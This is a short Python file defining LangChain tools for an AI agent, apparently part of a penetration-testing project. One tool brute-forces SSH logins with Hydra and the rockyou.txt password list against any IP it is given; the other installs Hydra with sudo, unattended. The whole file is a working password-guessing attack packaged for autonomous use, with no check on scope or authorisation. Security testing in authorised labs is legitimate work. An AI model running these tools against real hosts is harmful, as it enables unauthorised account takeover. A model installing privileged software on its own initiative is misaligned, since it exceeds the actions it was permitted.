from langchain_core.tools import tool
import subprocess

@tool
def brute_force_ssh(container_ip: str, username: str, pass_list_path: str = "/root/devguard/backend/devguard/examples/ssh-pentest/rockyou.txt", threads: int = 4):
    """
    Brute-force SSH login for a Docker container using Hydra.
    
    Args:
        container_ip (str): The IP address of the container.
        username (str): The username used for ssh.
        pass_list_path (str): Path to the file containing passwords.
        threads (int): Number of parallel connections (default: 4).
    
    Returns:
        str: Success or error message.
    """
    
    command = ["hydra", "-l", username, "-P", pass_list_path, container_ip, "ssh", "-t", str(threads)]
    
    try:
        result = subprocess.run(command, capture_output=True, text=True)
        if result.returncode == 0:
            return f"Brute force completed. Output:\n{result.stdout}"
        else:
            return f"Failed to brute force. Error: {result.stderr.strip()}"
    except FileNotFoundError as e:
        if 'hydra' in str(e):
            return "Hydra is required for brute-forcing. Install it using 'sudo apt-get install hydra'."
        return f"Command error: {str(e)}"

@tool
def install_hydra():
    """Installs hydra on a system using apt-get."""
    try:
        command = ["sudo", "apt-get", "install", "-y", "hydra"]
        result = subprocess.run(command, capture_output=True, text=True)
        
        if result.returncode == 0:
            return "hydra installed successfully."
        else:
            return f"Error installing hydra: {result.stderr.strip()}"
    except Exception as e:
        return f"An unexpected error occurred: {str(e)}"


hydra_tools = [brute_force_ssh, install_hydra]